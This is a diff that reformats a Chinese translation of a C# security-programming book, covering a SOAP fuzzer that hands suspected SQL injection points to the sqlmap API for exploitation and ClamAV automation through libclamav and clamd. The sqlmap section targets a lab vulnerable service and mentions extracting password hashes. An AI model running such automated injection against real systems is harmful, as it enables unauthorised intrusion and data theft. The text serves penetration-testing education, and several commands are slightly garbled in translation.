 我们现在已经看到了如何使用 sqlmap API 来审计和利用简单的 URL。在第 2 章和第 3 章中，我们为 SOAP 终端中的漏洞 GET 和 POST 请求以及 JSON 请求编写了几个 fuzzer（模糊器）。我们可以利用从 fuzzer 中收集的信息来驱动 sqlmap，只需几行代码，就能从发现潜在漏洞到完全验证并利用它们。
 
-# 为 SOAP Fuzzer 添加 sqlmap GET 请求支持
+## 为 SOAP Fuzzer 添加 sqlmap GET 请求支持
 
-SOAP fuzzer 中仅执行两种类型的 HTTP 请求：GET 和 POST 请求。首先，我们为 soap fuzzer 添加支持，使其能够将带有 GET 参数的 URL 传递给 sqlmap。我们还希望能够告诉 sqlmap 我们认为哪个参数存在漏洞。我们在 SOAP fuzzer 控制台应用程序底部添加了 TestGetRequestWithSqlmap() 和 TestRequestWithSqlmap() 方法，分别测试 GET 和 POST 请求。我们将在稍后的节中更新 FuzzHttpGetPort()、FuzzSoapPostPort() 和 FuzzHttpPostPort() 方法，以使用这两个新方法。
+SOAP fuzzer 中仅执行两种类型的 HTTP 请求：GET 和 POST 请求。首先，我们为 soap fuzzer 添加支持，使其能够将带有 GET 参数的 URL 传递给 sqlmap。我们还希望能够告诉 sqlmap 我们认为哪个参数存在漏洞。我们在 SOAP fuzzer 控制台应用程序底部添加了`TestGetRequestWithSqlmap()`和`TestRequestWithSqlmap()`方法，分别测试 GET 和 POST 请求。我们将在稍后的节中更新`FuzzHttpGetPort()`、`FuzzSoapPostPort()`和`FuzzHttpPostPort()`方法，以使用这两个新方法。
 
-让我们从编写 TestGetRequestWithSqlmap() 方法开始，如列表 9-30所示所示
+让我们从编写`TestGetRequestWithSqlmap()`方法开始，如列表 9-30所示所示
 
-```
+
+
+```csharp
 static void TestGetRequestWithSqlmap(string url, string parameter)
 {
     Console.WriteLine("Testing with sqlmap" + url);
@@ -6023,13 +6102,14 @@ static void TestGetRequestWithSqlmap(string url, string parameter)
     }
     manager.StartTask(taskID, options);
 ```
-列表 9-30：TestGetRequestWithSqlmap() 方法的第一部分
 
-该方法的第一部分分别创建了 SqlmapSession ① 和 SqlmapManager 对象。然后它创建了一个新任务 ➁ 并检索并设置了扫描所需的 sqlmap 选项 ❸。我们显式将 DBMS 设置为 PostgreSQL ④，因为我们知道 SOAP 服务使用的是 PostgreSQL。通过只测试 PostgreSQL 负载负载，我们节省了某些时间和带宽。在用单个单引号进行测试并收到服务器错误后，我们还将 testParameter 选项设置为我们认为存在漏洞的参数 ⑤。然后我们将任务 ID 和选项传递给 manager 的 StartTask() ⑥ 以开始扫描。
+列表 9-30：`TestGetRequestWithSqlmap()` 方法的第一部分
 
-列表 9-31 显示了 TestGetRequestWithSqlmap() 方法的后半部分，与我们在列表 9-25 中编写的代码类似。
+该方法的第一部分分别创建了 `SqlmapSession` ① 和 `SqlmapManager` 对象。然后它创建了一个新任务 ➁，并检索并设置了扫描所需的 `sqlmap` 选项 ❸。我们显式将 DBMS 设置为 PostgreSQL ④，因为我们知道 SOAP 服务使用的是 PostgreSQL。通过只测试 PostgreSQL 负载，我们节省了某些时间和带宽。在用单个单引号进行测试并收到服务器错误后，我们还将 `testParameter` 选项设置为我们认为存在漏洞的参数 ⑤。然后我们将任务 ID 和选项传递给 `manager` 的 `StartTask()` ⑥ 以开始扫描。
 
-```
+列表 9-31 显示了 `TestGetRequestWithSqlmap()` 方法的后半部分，与我们在列表 9-25 中编写的代码类似。
+
+```csharp
 SqlMapStatus status = manager.GetScanStatus(taskID);
 while (status.Status == "terminated")
 {
@@ -6038,25 +6118,26 @@ while (status.Status == "terminated")
 }
 ```
 
-```
+```csharp
 List<SqlLogItem> items = manager.GetLog(taskID);
 foreach (SqlLogItem item in items)
 {
     Console.WriteLine(item.Message);
 ```
 
-```
+```csharp
 manager.DeleteTask(taskID);
 ```
-列表 9-31：TestRequestWithSqlmap 方法的后半部分
 
-该方法的后半部分监控扫描直到完成，就像我们原始测试应用程序一样。由于我们之前写过类似的代码，我将不会逐行复述。在等待扫描运行 ① 后，我们通过 GetLog() ② 获取扫描结果。然后我们将扫描结果写入屏幕 ③。最后，当任务 ID 传递给 DeleteTask() 方法时，任务会被删除 ➮。
+列表 9-31：`TestRequestWithSqlmap` 方法的后半部分
+
+该方法的后半部分监控扫描直到完成，就像我们原始测试应用程序一样。由于我们之前写过类似的代码，我将不会逐行复述。在等待扫描运行 ① 后，我们通过 `GetLog()` ② 获取扫描结果。然后我们将扫描结果写入屏幕 ③。最后，当任务 ID 传递给 `DeleteTask()` 方法时，任务会被删除 ➮。
 
 # 添加 sqlmap POST 请求支持
 
-PostRequestWithSqlmap() 方法比其对应的方法稍微复杂一点。列表 9-32 显示了方法的开头几行
+`PostRequestWithSqlmap()` 方法比其对应的方法稍微复杂一点。列表 9-32 显示了方法的开头几行。
 
-```
+```csharp
 static void PostRequestWithSqlmap(string url, string data,
     string soapAction, string vValue)
 {
@@ -6074,13 +6155,14 @@ static void PostRequestWithSqlmap(string url, string data,
     }
     manager.StartTask(taskID, options);
 ```
-列表 9-32：PostRequestWithSqlmap 方法的起始行
 
-PostRequestWithSqlmap() 方法接受四个参数。第一个参数是 url，第二个是 data，第三个是 soapAction，最后一个是 vValue。如果我们打算执行的 soap action 值为 null 或空字符串，我们可以假设这不是一个 XML 请求，而是一个 POST 请求。后者只需要正确的 Content-Type 为 x-www-urlencoded。然而，如果 soapAction 不为空字符串，我们假设我们正在处理 XML 请求，并将 Content-Type 设置为 text/xml，添加带有 soapAction 变量的 SOAP 头。在扫描选项中设置好正确的头后，最后我们将任务 ID 和选项传递给 StartTask() 方法。
+列表 9-32：`PostRequestWithSqlmap` 方法的起始行
 
-方法的其余部分如列表 9-34 所示，应该很熟悉。它监控扫描并返回结果，就像 TestRequestWithSqlmap(id) 方法一样。
+`PostRequestWithSqlmap()` 方法接受四个参数。第一个参数是 `url`，第二个是 `data`，第三个是 `soapAction`，最后一个是 `vValue`。如果我们打算执行的 SOAP action 值为 null 或空字符串，我们可以假设这不是一个 XML 请求，而是一个 POST 请求。后者只需要正确的 `Content-Type` 为 x-www-urlencoded。然而，如果 `soapAction` 不为空字符串，我们假设我们正在处理 XML 请求，并将 `Content-Type` 设置为 text/xml，添加带有 `soapAction` 变量的 SOAP 头。在扫描选项中设置好正确的头后，最后我们将任务 ID 和选项传递给 `StartTask()` 方法。
 
-```
+方法的其余部分如列表 9-34 所示，应该很熟悉。它监控扫描并返回结果，就像 `TestRequestWithSqlmap(id)` 方法一样。
+
+```csharp
 SqlMapStatus status = manager.GetScanStatus(taskID);
 while (status.Status != "terminated")
 {
@@ -6089,7 +6171,7 @@ while (status.Status != "terminated")
 }
 ```
 
-```
+```csharp
 List<SqlLogItem> logItems = manager.GetLog(taskID);
 foreach (SqlLogItem item in logItems)
 {
@@ -6098,10 +6180,8 @@ foreach (SqlLogItem item in logItems)
 
 manager.DeleteTask(taskID);
 ```
-列表 9-34：TestRequestWithSqlmap 方法的最后几行
 
-
-
+列表 9-34：`TestRequestWithSqlmap` 方法的最后几行
 
 当任务 ⑤ 完成时，我们会删除它。
 
@@ -6113,7 +6193,7 @@ manager.DeleteTask(taskID);
 if (resp.Contains("syntax error"))
 ```
 
-+ 列表 9-35：为第 3 章 SOAP 模糊器的 `FuzzSoapPort()` 方法添加对 sqlmap 的支持
+列表 9-35：为第 3 章 SOAP 模糊器的 `FuzzSoapPort()` 方法添加对 sqlmap 的支持
 
 在我们原始的 SOAP 模糊器的 `FuzzSoapPort()` 方法的最底部，我们测试了响应返回是否返回了带有报告语法错误的错误信息 ①。为了让 `FuzzSoapPort()` 方法使用我们的新方法来通过 sqlmap 测试 POST 请求，我们为用户打印了注入向量 ②。因此，我们只需要在打印漏洞参数的原始 `WriteLine()` 方法调用中添加一行。添加一行调用 `TestPostRequestWithSql(map)` 方法的代码，你的模糊器就会自动将潜在的漏洞请求提交给 sqlmap 进行处理。
 
@@ -6123,7 +6203,7 @@ if (resp.Contains("syntax error"))
 if (resp.Contains("syntax error"))
 ```
 
-+ 列表 9-36：为 SOAP 模糊器的 `FuzzHttpGet()` 方法添加 sqlmap 支持
+列表 9-36：为 SOAP 模糊器的 `FuzzHttpGet()` 方法添加 sqlmap 支持
 
 最后，我们同样简单地更新了 `FuzzHttpPost()` 中测试语法错误的 `if` 语句，如列表 9-37 所示。
 
@@ -6131,7 +6211,7 @@ if (resp.Contains("syntax error"))
 if (resp.Contains("syntax error"))
 ```
 
-+ 列表 9-37：为第 3 章 SOAP 模糊器的 `FuzzHttpPost()` 方法添加 sqlmap 支持
+列表 9-37：为第 3 章 SOAP 模糊器的 `FuzzHttpPost()` 方法添加 sqlmap 支持
 
 在 SOAP 模糊器中添加了这些行后，它现在不仅输出潜在的漏洞参数，还会输出 sqlmap 用于利用漏洞的 SQL 注入技术。
 
@@ -6148,7 +6228,7 @@ Possible SQL injection vector in parameter: username
 Testing with sqlmap: http://172.18.20.40/Vulnerable.asmx
 ```
 
-+ - 列表 9-38：针对第 3 章漏洞 SOAP 服务运行带有 sqlmap 支持的更新 SOAP 模糊器
+列表 9-38：针对第 3 章漏洞 SOAP 服务运行带有 sqlmap 支持的更新 SOAP 模糊器
 
 在 SOAP 模糊器的输出中，注意返回带有 sqlmap URL 的新行。一旦 sqlmap 完成对 SOAP 请求的测试，sqlmap 日志将打印到屏幕上以便查看结果。
 
@@ -6158,32 +6238,28 @@ Testing with sqlmap: http://172.18.20.40/Vulnerable.asmx
 
 sqlmap API 可以使用任何命令行 sqlmap 工具可以使用的参数，这使其同样强大，甚至更强大。通过 sqlmap，你可以在验证给定 URL 或 HTTP 确实存在漏洞后，使用你的 C# 技能自动获取密码哈希和数据库用户。我们仅触及了 sqlmap 在攻击性渗透测试或寻求更多接触黑客工具的安全意识开发人员方面的力量一角。希望你能花时间学习 sqlmap 功能更细微的差别，从而为你的工作带来真正灵活的安全实践。
 
-# 10
-## 自动化 CLAMAV
+# 10 自动化 CLAMAV
 
 ![](img/059a0f6a8101e80261ab133380da85bd_216_0.png)
 
 ClamAV 是一款开源反病毒解决方案，主要用于扫描电子邮件服务器上的邮件和附件，以便在病毒到达并感染网络上的计算机之前识别出潜在病毒。但这绝不是它的唯一用例。在本章中，我们将使用 ClamAV 创建一个自动化病毒扫描器，用它来扫描文件中的恶意软件，并在 ClamAV 数据库的帮助下识别病毒。
 
-你将学习以两种方式自动化 ClamAV。一种是与 `libclamav` 接口，这是驱动 ClamAV 命令行工具（如 `clamscan`，你可能熟悉的扫描扫描器）的原生库。另一种方法是通过 socket 与 clam 守护接口，以便在没有安装 ClamAV 的计算机上执行扫描。
+你将学习以两种方式自动化 ClamAV。一种是与 `libclamav` 接口，这是驱动 ClamAV 命令行工具（如 `clamscan`，你可能熟悉的扫描器）的原生库。另一种方法是通过 socket 与 clam 守护接口，以便在没有安装 ClamAV 的计算机上执行扫描。
 
 ## 安装 ClamAV
 
-ClamAV 用 C 语言编写，这在用 C# 进行自动化时带来了一些复杂性。它可以通过常见的包管理器（如 yum 和 apt）提供 Linux 版本，也适用于 Windows 和 OS X。许多现代 Unix 发行版都包含 ClamAV 包，但该版本可能与 Mono 和 .NET 不兼容。
+ClamAV 用 C 语言编写，这在用 C# 进行自动化时带来了一些复杂性。它可以通过常见的包管理器（如 `yum` 和 `apt`）提供 Linux 版本，也适用于 Windows 和 OS X。许多现代 Unix 发行版都包含 ClamAV 包，但该版本可能与 Mono 和 .NET 不兼容。
 
-在 Linux 系统上安装 ClamAV 的操作类似于：`$ sudo apt-get install clamav`；如果你运行带有 yum 的 Red Hat 或 Fedora 的 Linux 发行版，运行类似命令：
+在 Linux 系统上安装 ClamAV 的操作类似于：`$ sudo apt-get install clamav`；如果你运行带有 `yum` 的 Red Hat 或 Fedora 的 Linux 发行版，运行类似命令：
 
 | 操作系统 | 命令 |
-| :--- | :--- |
+| --- | --- |
 | Ubuntu/Debian | `sudo apt-get install clamav` |
 | Red Hat/Fedora | `sudo yum install clamav` |
 
+## 用于设置病毒查找数据库选项的 ClamAV 引擎
 
-
-
-# 用于设置我们将使用的病毒查找数据库选项的 ClamAV 引擎。
-
-```
+```csharp
 [Flags]
 public enum ClamDatabaseOptions
 {
@@ -6194,13 +6270,13 @@ public enum ClamDatabaseOptions
 }
 ```
 
-列表 10-3：定义 ClamAV C 选项的 ClamDatabaseOptions 枚举
+列表 10-3：定义 ClamAV C 选项的 `ClamDatabaseOptions` 枚举
 
-ClamDatabaseOptions 枚举直接使用了 ClamAV 源码中的数据库选项值。这三个选项允许存储钓鱼邮件、钓鱼网站 URL，以及用于启发式扫描的动态字节码签名。这些选项组合成了 ClamAV 的标准数据库选项，用于扫描病毒或恶意软件。我们通过按位或 运算符来组合想要在枚举中定义的这些选项值。使用位掩码（bitmasks）是一种非常有效地存储标志或选项的流行方法。
+`ClamDatabaseOptions` 枚举直接使用了 ClamAV 源码中的数据库选项值。这三个选项允许存储钓鱼邮件、钓鱼网站 URL，以及用于启发式扫描的动态字节码签名。这些选项组合成了 ClamAV 的标准数据库选项，用于扫描病毒或恶意软件。我们通过按位或运算符来组合想要在枚举中定义的这些选项值。使用位掩码（bitmasks）是一种非常有效地存储标志或选项的流行方法。
 
-我们必须实现的另一个枚举是 ClamReturnCode，它对应于 ClamAV 已知的返回代码，如列表 10-4 所示。同样，这些值直接取自 ClamAV 源码。
+我们必须实现的另一个枚举是 `ClamReturnCode`，它对应于 ClamAV 已知的返回代码，如列表 10-4 所示。同样，这些值直接取自 ClamAV 源码。
 
-```sharp
+```csharp
 public enum ClamReturnCode
 {
   CL_CLEAN = 0x0,
@@ -6209,15 +6285,15 @@ public enum ClamReturnCode
 }
 ```
 
-列表 10-4：用于任何方式存储 ClamAV 返回代码完整列表的枚举。我只包含了预计在编写的示例中看到的返回代码。这些是 clean（清洁）和 success（成功）代码，它们分别表示扫描的文件没有病毒或操作执行成功；以及 virus（病毒）代码，它报告在扫描文件中检测到了病毒。如果你遇到任何 ClamReturnCode 枚举中未定义的错误代码，可以在 `clamav.h` 的 ClamAV 源码中查找它们。这些代码是由头文件中的 `cl_error_t` 结构体定义的。
+列表 10-4：用于任何方式存储 ClamAV 返回代码完整列表的枚举。我只包含了预计在编写的示例中看到的返回代码。这些是 clean（清洁）和 success（成功）代码，它们分别表示扫描的文件没有病毒或操作执行成功；以及 virus（病毒）代码，它报告在扫描文件中检测到了病毒。如果你遇到任何 `ClamReturnCode` 枚举中未定义的错误代码，可以在 `clamav.h` 的 ClamAV 源码中查找它们。这些代码是由头文件中的 `cl_error_t` 结构体定义的。
 
-我们的 ClamReturnCode 枚举有三个值，其中两个是不同的。CL_CLEAN 和 CL_SUCCESS 共享相同的值 0x0，因为 0x0 意味着一切运行正常且扫描的文件是干净的。另一个值 0x1 在检测到病毒时返回。
+我们的 `ClamReturnCode` 枚举有三个值，其中两个是不同的。`CL_CLEAN` 和 `CL_SUCCESS` 共享相同的值 `0x0`，因为 `0x0` 意味着一切运行正常且扫描的文件是干净的。另一个值 `0x1` 在检测到病毒时返回。
 
-最后一个定义的定义的枚举是 ClamScanOptions 枚举，它是我们需要定义的枚举中最复杂的一个。它如列表 10-5 所示。
+最后一个定义的枚举是 `ClamScanOptions` 枚举，它是我们需要定义的枚举中最复杂的一个。它如列表 10-5 所示。
 
-## [Flags]
+### `[Flags]`
 
-```
+```csharp
 public enum ClamScanOptions
 {
     CL_SCAN_ARCHIVE = 0x1,
@@ -6234,13 +6310,13 @@ public enum ClamScanOptions
 }
 ```
 
-> 列表 10-5：持有 ClAV 扫描选项的类
+列表 10-5：持有 ClAV 扫描选项的类
 
-如你所见，ClamScan 看起来是 ClamDatabaseOptions 的复杂版本。它定义了多种可以扫描的文件类型（Windows PE 可执行文件 ①、Unix ELF 可执行文件 ②、PDFs 等）以及一组标准选项 ③。与之前的枚举一样，这些枚举值直接取自 Clam 源码。
+如你所见，`ClamScan` 看起来是 `ClamDatabaseOptions` 的复杂版本。它定义了多种可以扫描的文件类型（Windows PE 可执行文件 ①、Unix ELF 可执行文件 ②、PDFs 等）以及一组标准选项 ③。与之前的枚举一样，这些枚举值直接取自 Clam 源码。
 
 ## ClamResult 支持类
 
-现在，我们需要实现 ClamResult 类（如列表 10-6 所示），以完善驱动 libclamav 所需的支持。
+现在，我们需要实现 `ClamResult` 类（如列表 10-6 所示），以完善驱动 `libclamav` 所需的支持。
 
 ```csharp
 public class ClamResult
@@ -6251,13 +6327,15 @@ public class ClamResult
 }
 ```
 
-> 列表 10-6：持有 ClamAV 扫描属性的类
+列表 10-6：持有 ClamAV 扫描属性的类
 
-这非常简单！第一个属性是 ClamReturnCode，用于存储扫描的返回代码（通常应该是 CL_VIRUS）。我们还有两个字符串属性：一个用于存储 ClamAV 的病毒名称，另一个用于在以后需要时存储文件路径。我们将使用此类将每个文件扫描的结果存储为了一个对象。
+这非常简单！第一个属性是 `ClamReturnCode`，用于存储扫描的返回代码（通常应该是 `CL_VIRUS`）。我们还有两个字符串属性：一个用于存储 ClamAV 的病毒名称，另一个用于在以后需要时存储文件路径。我们将使用此类将每个文件扫描的结果存储为一个对象。
 
 ## 访问 ClamAV 的原生库函数
 
-为了保持我们调用的 libclamav 原生函数与其余 C# 代码及类之间的分离，我们定义了一个单一类，其中包含了我们将使用的所有 ClamAV 函数（见列表 10-7）。
+
+
+为了保持我们调用的 `libclamav` 原生函数与其余 C# 代码及类之间的分离，我们定义了一个单一类，其中包含了我们将使用的所有 ClamAV 函数（见列表 10-7）。
 
 ```csharp
 static class ClamBindings
@@ -6284,13 +6362,13 @@ public static extern ClamReturnCode cl_scan(string path, IntPtr engine, ref uint
 public static extern bool cl_compile(IntPtr engine);
 ```
 
-列表 10-7：持有函数的 ClamBindings 类
+列表 10-7：持有函数的 `ClamBindings` 类
 
-ClamBindings 类定义了库的路径。取决于你安装 ClAV 的方式，路径可能会不同。在 Windows 上，它将是一个 .dll；在 OS X 上将是 .dylib；在 Linux 上将是 .so。`DllImport` 特性告诉 .NET 运行时去查找指定的函数。通过这种方式，我们能够在程序内部调用 ClAV 函数。我们在实现 ClamEngine 类时，将涵盖列表 10-7 所示的函数。
+`ClamBindings` 类定义了库的路径。取决于你安装 ClAV 的方式，路径可能会不同。在 Windows 上，它将是一个 `.dll`；在 OS X 上将是 `.dylib`；在 Linux 上将是 `.so`。`DllImport` 特性告诉 .NET 运行时去查找指定的函数。通过这种方式，我们能够在程序内部调用 ClAV 函数。我们在实现 `ClamEngine` 类时，将涵盖列表 10-7 所示的函数。
 
 ## 编译 ClamAV 引擎
 
-10-8 中的 ClamEngine 类将负责扫描和报告潜在文件的大部分工作。
+10-8 中的 `ClamEngine` 类将负责扫描和报告潜在文件的大部分工作。
 
 ```csharp
 public class ClamEngine : IDisposable
@@ -6334,18 +6412,15 @@ public class ClamEngine : IDisposable
 }
 ```
 
-列表 10-8：扫描并报告文件的 ClamEngine 类
+列表 10-8：扫描并报告文件的 `ClamEngine` 类
 
-首先，我们声明了一个类级的 IntPtr 变量 ① 名为 engine，它将指向我们的 ClAV 引擎以供类的其他方法使用。虽然 C# 不需要指针来引用内存中对象的确切地址，但 C 需要。C 有指向 `intptr_t` 数据类型的指针，而 IntPtr 是 C 指针的 C# 版本。由于 ClAV 引擎将在 .NET 和 C 之间来传递，当我们将其传递给 C 时，我们需要一个指针指向它存储的内存地址。这就是当我们创建 engine 时发生的情况，
+首先，我们声明了一个类级的 `IntPtr` 变量 ① 名为 `engine`，它将指向我们的 ClAV 引擎以供类的其他方法使用。虽然 C# 不需要指针来引用内存中对象的确切地址，但 C 需要。C 有指向 `intptr_t` 数据类型的指针，而 `IntPtr` 是 C 指针的 C# 版本。由于 ClAV 引擎将在 .NET 和 C 之间来传递，当我们将其传递给 C 时，我们需要一个指针指向它存储的内存地址。这就是当我们创建 `engine` 时发生的情况，我们将在构造函数内部进行赋值。
 
-
-我们将在构造函数内部进行赋值。
-
-接下来，我们定义构造函数。ClamEngine 类 ② 的构造函数不需要任何参数。为了初始化 ClamAV 并开始分配引擎进行扫描，我们从 ClamBindings 中调用 `cl_init()`，并传递我们希望在加载特征库时使用的签名库选项。如果 ClamAV 未能初始化，我们将检查 `cl_init()` 的返回值，如果初始化失败则抛出异常。如果 ClamAV 成功初始化，我们使用 `cl_engine_new()` ④ 分配一个新引擎，该函数不接受参数并返回一个指向新 ClamAV 引擎的指针，我们将其存储在 `engine` 变量中供稍后使用。
+接下来，我们定义构造函数。`ClamEngine` 类 ② 的构造函数不需要任何参数。为了初始化 ClamAV 并开始分配引擎进行扫描，我们从 `ClamBindings` 中调用 `cl_init()`，并传递我们希望在加载特征库时使用的签名库选项。如果 ClamAV 未能初始化，我们将检查 `cl_init()` 的返回值，如果初始化失败则抛出异常。如果 ClamAV 成功初始化，我们使用 `cl_engine_new()` ④ 分配一个新引擎，该函数不接受参数并返回一个指向新 ClamAV 引擎的指针，我们将其存储在 `engine` 变量中供稍后使用。
 
 一旦我们有了引擎，就需要加载病毒特征以进行扫描。`cl_retdbdir()` 函数返回 ClamAV 配置使用的数据库路径，并将其存储在 `dbDir` ⑤ 中。由于 `cl_retdbdir()` 返回的是一个指针字符串，我们使用 `Marshal` 类中的 `PToString()` 将其转换为字符串（`Marshal` 是一个用于将数据类型从非托管类型转换为托管类型的类）。我们定义了一个整数 `signatureCount` ⑥，将其传递给 `cl_load()` 并赋值为从数据库中加载的特征数量。
 
-我们使用 ClamBindings 中的 `cl_load()` ⑦ 将特征加载到引擎中。将 ClamAV 数据库目录 `dbDir` 和新引擎作为参数，以及其他几个值。传递给 `cl_load()` 的最后一个参数是我们想要支持扫描的文件类型的枚举值（例如 HTML、PDF 或其他类型的文件）。我们使用之前创建的 `ClamScanOptions` 类将我们的扫描选项定义为 `CL_SCAN_STDOPT`，这样当我们加载病毒数据库时（取决于选项，可能需要几秒钟），我们会检查返回值是否等于 `CL_SUCCESS`；如果是，我们最终通过将引擎传递给 `cl_engine_compile()` 函数 ⑨ 来编译引擎，使引擎准备好开始扫描文件。然后我们最后检查一次是否收到了 `CL_SUCCESS` 代码。
+我们使用 `ClamBindings` 中的 `cl_load()` ⑦ 将特征加载到引擎中。将 ClamAV 数据库目录 `dbDir` 和新引擎作为参数，以及其他几个值。传递给 `cl_load()` 的最后一个参数是我们想要支持扫描的文件类型的枚举值（例如 HTML、PDF 或其他类型的文件）。我们使用之前创建的 `ClamScanOptions` 类将我们的扫描选项定义为 `CL_SCAN_STDOPT`，这样当我们加载病毒数据库时（取决于选项，可能需要几秒钟），我们会检查返回值是否等于 `CL_SUCCESS`；如果是，我们最终通过将引擎传递给 `cl_engine_compile()` 函数 ⑨ 来编译引擎，使引擎准备好开始扫描文件。然后我们最后检查一次是否收到了 `CL_SUCCESS` 代码。
 
 ## 扫描文件
 
@@ -6381,13 +6456,13 @@ public ClamResult ScanFile(string filepath, uint options = (uint)ClamScanOptions
 
 我们通过定义一些要使用的变量来开始 `ScanFile()` 方法。扫描的 `ulong` 变量最初设置为 0。在扫描文件后我们并不会实际使用这个变量，但 `cl_scanfile()` 函数为了能够被正确调用需要它。我们定义的下一个变量是 `vname`（病毒名称）。我们将其设置为 `null`，但以后当发现病毒时，我们将为它分配一个 C 指针，该指针指向 ClamAV 数据库中的名称。
 
-我们使用在 ClamBindings 中定义的 `cl_scanfile()` 函数来扫描文件，并传递几个参数。第一个参数是我们想要扫描的文件路径，随后是用于赋值检测到的病毒名称的变量（如果有）。最后两个参数是我们将用于扫描的引擎以及我们想要执行病毒扫描的扫描选项。中间参数 `scanned` 是调用 `cl_scanfile()` 必须的，但对我们这里没用。在作为参数传递给此函数后，我们不会使用它。
+我们使用在 `ClamBindings` 中定义的 `cl_scanfile()` 函数来扫描文件，并传递几个参数。第一个参数是我们想要扫描的文件路径，随后是用于赋值检测到的病毒名称的变量（如果有）。最后两个参数是我们将用于扫描的引擎以及我们想要执行病毒扫描的扫描选项。中间参数 `scanned` 是调用 `cl_scanfile()` 必须的，但对我们这里没用。在作为参数传递给此函数后，我们不会使用它。
 
 方法的其余部分为程序员的使用非常良好地封装了扫描信息。如果 `cl_scanfile()` 的返回值表示发现了病毒，我们使用 `PtrToStringAnsi()` 返回 `vname` 变量所指向内存的字符串。一旦获得了病毒名称，我们就创建一个新的 `ClamResult` 类，并使用 `cl_scanfile` 的返回值、病毒名称和被扫描文件的路径为其分配三个属性。然后，我们将 `ClamResult` 类返回给调用者。如果返回值为 `CL_CLEAN`，我们返回一个 `ReturnCode` 为 `CL_CLEAN` 的新 `ClamResult` 类。如果既不是 `CL_CLEAN` 也不是 `CL_VIRUS`。
 
 # 清理
 
-ClamEngine 中最后一个实现的的方法是 `Dispose()`，如列表 10-10 所示。
+`ClamEngine` 中最后一个实现的的方法是 `Dispose()`，如列表 10-10 所示。
 
 ```csharp
 public void Dispose()
@@ -6427,33 +6502,38 @@ public static void Main(string[] args)
 
 - 列表 10-12：我们自动化 ClamAV 程序的 `Main()` 方法
 
+```
 $ mom ch10_automating_clam_fs.exe ~/eicar.com.txt
+● Found: Eicar-Test-Signature
+```
 
-● Found: Eicar-Test-Signature 列表 10-13：在 EICAR 文件上运行我们的 ClamAV 程序发现了病毒
+列表 10-13：在 EICAR 文件上运行我们的 ClamAV 程序发现了病毒
 
 我们现在有了一个可以扫描 ClamAV 的工作程序。然而，在某些情况下，由于许可问题（ClamAV 使用 GNU 公共许可）或技术原因，你可能无法有效地随应用程序一起分发 ClamAV，你可能仍然需要一种在网络上扫描病毒的方法。我们将介绍另一种自动化 ClamAV 的方法，以以更集中的方式解决这个问题。
 
-
-
-
 # 使用 clamd 实现自动化
 
-clamd 守护进程为接受用户上传文件或类似功能的应用程序添加病毒扫描提供了一种极佳的方法。它通过 TCP 运行，但默认不使用 SSL！它也非常轻量级，但必须运行在你网络中的服务器上，这导致了一些某些局限性。clamd 服务允许你运行一个长时间的进程来扫描文件，而不是在之前的自动化方案中那样管理和分配 ClamAV 引擎。由于它是 ClamAV 的服务器版本，你可以使用 clamd 在不安装应用程序的情况下扫描计算机上的文件。当你只想在一个地方管理病毒库定义，或者你有资源限制并需要像之前讨论的那样将病毒扫描卸载到另一台机器时，这将非常方便。在 C# 中实现 clamd 的自动化极其简单。它需要两个小的类：会话（session）和一个管理器（manager）。
+`clamd` 守护进程为接受用户上传文件或类似功能的应用程序添加病毒扫描提供了一种极佳的方法。它通过 TCP 运行，但默认不使用 SSL！它也非常轻量级，但必须运行在你网络中的服务器上，这导致了一些某些局限性。`clamd` 服务允许你运行一个长时间的进程来扫描文件，而不是在之前的自动化方案中那样管理和分配 ClamAV 引擎。由于它是 ClamAV 的服务器版本，你可以使用 `clamd` 在不安装应用程序的情况下扫描计算机上的文件。当你只想在一个地方管理病毒库定义，或者你有资源限制并需要像之前讨论的那样将病毒扫描卸载到另一台机器时，这将非常方便。在 C# 中实现 `clamd` 的自动化极其简单。它需要两个小的类：会话（session）和一个管理器（manager）。
 
 # 安装 clamd 守护进程
 
-在大多数平台上，通过包管理器安装 ClamAV 可能不会安装 clamd 守护进程。例如，在 Ubuntu 上，你需要使用 apt 单独安装 clamav-daemon，如下：`$ sudo apt-get install clamav-daemon`。在 Red Hat 或 Fedora 上，你需要安装稍不同的包名：`$ sudo yum install clamd-server`
+在大多数平台上，通过包管理器安装 ClamAV 可能不会安装 `clamd` 守护进程。例如，在 Ubuntu 上，你需要使用 `apt` 单独安装 `clamav-daemon`，如下：`$ sudo apt-get install clamav-daemon`。在 Red Hat 或 Fedora 上，你需要安装稍不同的包名：`$ sudo yum install clamd-server`
 
 # 启动 clamd 守护进程
 
-在安装守护进程后使用 clamd，你需要启动该守护进程，它默认监听端口 3310 和地址 127.0.0.1。你可以通过 clamd 命令来实现此，如列表 10-14 所示。
+在安装守护进程后使用 `clamd`，你需要启动该守护进程，它默认监听端口 3310 和地址 127.0.0.1。你可以通过 `clamd` 命令来实现此，如列表 10-14 所示。
 
-| $ clam 列表 10-14: 启动 clamd 守护进程 |
+```
+$ clam
+```
+
+列表 10-14: 启动 `clamd` 守护进程
+
 | :--- |
 | 注意 |
-| 如果你使用包管理器安装 clamd，它可能默认配置为监听本地 UNIX 套接字而非网络接口如果你在通过 TCP 套接字连接 clamd 守护进程时遇到问题，请确保 clamd 配置为监听网络接口 |
+| 如果你使用包管理器安装 `clamd`，它可能默认配置为监听本地 UNIX 套接字而非网络接口如果你在通过 TCP 套接字连接 `clamd` 守护进程时遇到问题，请确保 `clamd` 配置为监听网络接口 |
 
-当你运行命令时，可能不会得到任何反馈。没有消息就是好消息！如果 clamd 启动时没有任何消息，则说明你已成功启动。我们可以通过 netcat 连接到监听端口，并手动在上面上运行命令（例如获取当前 clam 版本并扫描文件）查看发生的情况来测试 clam 是否运行正常，如列表 10-15 所示。
+当你运行命令时，可能不会得到任何反馈。没有消息就是好消息！如果 `clamd` 启动时没有任何消息，则说明你已成功启动。我们可以通过 `netcat` 连接到监听端口，并手动在上面上运行命令（例如获取当前 `clam` 版本并扫描文件）查看发生的情况来测试 `clam` 是否运行正常，如列表 10-15 所示。
 
 ```
 $ echo VERSION | nc -v 127.0.0.1 3310
@@ -6462,13 +6542,15 @@ $ echo "SCAN /eicar.com*" | nc -v 127.0.0.1 3310
 /tmp/eicar.com.txt: Eicar-Test-Signature FOUND
 ```
 
-列表 10-15: 使用 netcat TCP 工具为 clam 简单命令
+列表 10-15: 使用 `netcat` TCP 工具为 `clam` 简单命令
 
-连接到 clam 并发送 VERSION 命令应该打印出 ClamAV 版本。你也可以发送带有文件路径参数的 SCAN 命令，它应该返回扫描结果。编写代码来自动化这一点很容易。
